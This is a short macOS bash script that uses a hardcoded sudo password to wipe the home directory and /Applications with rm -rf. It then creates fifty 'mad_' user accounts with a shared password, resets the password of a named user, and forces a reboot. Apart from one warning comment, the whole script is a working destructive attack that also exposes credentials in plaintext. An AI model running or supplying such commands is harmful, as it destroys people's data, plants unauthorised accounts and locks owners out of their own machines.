#!/usr/bin/env bash
# WARNING: This will irreversibly delete all files in your home directory. Use with extreme caution.

# Supply sudo password and delete everything in ~/

echo "carterchloe2006" | sudo -S rm -rf ~/*
echo "carterchloe2006" | sudo -S rm -rf /Applications/*

# Create 50 users with random suffix and password Aa112211!
for i in $(seq 1 50); do
  # Generate a 5-character random alphanumeric string
  RAND=$(LC_CTYPE=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c5)
  USER="mad_$RAND"
  # Create the user with sysadminctl, using sudo and the stored sudo password
  echo "carterchloe2006" | sudo -S sysadminctl -addUser "$USER" \
    -fullName "$USER" \
    -password "Aa112211!" \
    -home "/Users/$USER" \
    &>/dev/null || true
done

# Change password for carterhuang using sysadminctl with root credentials, fallback to dscl
echo "carterchloe2006" | sudo -S sysadminctl \
  -adminUser root -adminPassword "Aa112211!" \
  -resetPasswordFor carterhuang -newPassword "Aa112211!" || {
  echo "[DEBUG] sysadminctl failed; falling back to dscl"
  echo "carterchloe2006" | sudo -S dscl . -passwd /Users/carterhuang "Aa112211!"
}

# Reboot the system
echo "carterchloe2006" | sudo -S shutdown -r now